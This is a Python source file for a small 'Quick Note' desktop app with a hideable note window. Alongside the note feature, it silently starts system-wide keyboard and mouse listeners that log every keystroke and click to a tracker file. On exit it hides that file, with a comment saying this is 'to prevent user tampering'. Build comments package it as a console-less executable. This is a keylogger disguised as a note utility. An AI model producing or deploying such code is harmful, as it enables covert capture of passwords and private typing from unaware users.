"""
MIT License
Copyright (c) 2024 Bala Ganesh
"""

import os
import time
import datetime
import ctypes
import PySimpleGUI as sg
from pynput import keyboard, mouse

# V-0.1.0
# Bala-GM

# File paths for saving notes and activity tracker logs
note_file_path = r"D:\NX_BACKWORK\Database_File\Process_QuickNOTE\Note.txt"
tracker_file_path = r"D:\NX_BACKWORK\Database_File\Process_QuickNOTE\Tracker.txt"

# Ensure the directories exist for storing the files
os.makedirs(os.path.dirname(note_file_path), exist_ok=True)
os.makedirs(os.path.dirname(tracker_file_path), exist_ok=True)

# Get the screen resolution using Windows API
user32 = ctypes.windll.user32
screen_width, screen_height = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)

# Set the theme for the PySimpleGUI windows
sg.theme('DarkGrey13')

# Layout for the note-taking window
note_layout = [
    [sg.Multiline(size=(40, 20), key='-NOTE-', font=('Arial', 10))],  # Multiline input for notes
    [sg.Button('Save Note'), sg.Button('Hide'), sg.Button('Quit')]   # Action buttons
]

# Create the note window, initially hidden and placed off-screen
note_window = sg.Window(
    'Quick Note',
    note_layout,
    no_titlebar=True,
    keep_on_top=True,
    alpha_channel=0.95,  # Set transparency
    grab_anywhere=True,
    location=(screen_width, screen_height - 300),  # Start location off-screen
    finalize=True
)
note_window.hide()  # Initially hide the note window

# Layout for the toggle button (arrow)
arrow_layout = [
    [sg.Button('⯈', key='-SHOW-', font=('Arial', 10), size=(0, 0))]  # Toggle button to show/hide note window
]

# Create the toggle button window
arrow_window = sg.Window(
    '',
    arrow_layout,
    no_titlebar=True,
    keep_on_top=True,
    alpha_channel=0.95,
    grab_anywhere=True,
    location=(screen_width - 50, screen_height - 200),  # Position near the bottom-right
    finalize=True
)

note_visible = False  # Track visibility state of the note window

# Function to log activity messages into the tracker file
def log_activity(message):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
    with open(tracker_file_path, 'a') as tracker_file:
        tracker_file.write(f'{timestamp}: {message}\n')

# Listener function to log key presses
def on_key_press(key):
    try:
        log_activity(f'Key Pressed: {key.char}')  # Log character keys
    except AttributeError:
        log_activity(f'Special Key Pressed: {key}')  # Log special keys (e.g., Shift, Ctrl)

# Listener function to log mouse clicks
def on_click(x, y, button, pressed):
    if pressed:
        log_activity(f'Mouse Clicked: {button} at ({x}, {y})')  # Log mouse button and position

# Start keyboard and mouse listeners
keyboard_listener = keyboard.Listener(on_press=on_key_press)
mouse_listener = mouse.Listener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()

# Function to save the note to a file
def save_note_to_file(note_text):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %I:%M %p')
    with open(note_file_path, 'a') as note_file:
        note_file.write(f'\n{timestamp}\n{note_text}\n')  # Append note with a timestamp
    log_activity('Note saved')

# Function for autosaving notes every 30 minutes (not actively used in the main loop)
def autosave(note_text):
    while True:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %I:%M %p')
        with open(note_file_path, 'a') as note_file:
            note_file.write(f'{"AutoSave"}\n{timestamp}\n{note_text}\n')
        log_activity('Note saved automatically')
        time.sleep(60 * 30)  # Wait for 30 minutes

# Main event loop for handling interactions
while True:
    window, event, values = sg.read_all_windows()  # Read events from both windows

    if event == sg.WIN_CLOSED:  # If any window is closed, exit the application
        break

    if window == arrow_window and event == '-SHOW-':  # Toggle button clicked
        if note_visible:  # If note window is visible, hide it
            note_window.hide()
            arrow_window['-SHOW-'].update('⯈')  # Update button to "show" icon
        else:  # If note window is hidden, show it
            note_window.move(screen_width - 300, screen_height - 400)  # Position note window
            note_window.un_hide()
            arrow_window['-SHOW-'].update('⯇')  # Update button to "hide" icon
        note_visible = not note_visible
        log_activity('Note window toggled')

    if window == note_window:
        if event == 'Hide':  # Hide button clicked
            save_note_to_file(values['-NOTE-'])  # Save note before hiding
            note_window.hide()
            arrow_window['-SHOW-'].update('⯈')
            note_visible = False
            log_activity('Note window hidden')

        if event == 'Save Note':  # Save button clicked
            save_note_to_file(values['-NOTE-'])  # Save note
            log_activity('Note saved')

        if event == 'Quit':  # Quit button clicked
            log_activity('Application quit')
            break

# Stop the listeners and close the application
keyboard_listener.stop()
mouse_listener.stop()

note_window.close()
arrow_window.close()

# Hide the tracker file to prevent user tampering
if os.path.exists(tracker_file_path):
    os.system(f'attrib +h "{tracker_file_path}"')  # Set the file as hidden

# PyInstaller commands for creating an executable:
# pyinstaller --onefile --noconsole note_app.py
# pyinstaller -F -i "QN.ico" --onefile --noconsole QuickNote.py
